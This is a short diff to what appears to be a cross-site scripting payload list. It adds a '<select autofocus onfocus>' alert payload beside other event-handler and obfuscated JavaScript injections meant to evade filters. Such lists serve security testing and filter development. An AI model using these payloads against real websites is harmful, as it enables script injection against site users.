@@ -75,6 +75,7 @@ content['alert'](6)
 [11].findIndex(alert)
 [12].forEach(alert);
  
+ <select autofocus onfocus="alert`1`">
 <audio src onloadstart=alert(1)>
  <details/open/ontoggle="alert`1`">
 <body onpageshow=Set.constructor`al\x65rt\x28/xss/\x29```>
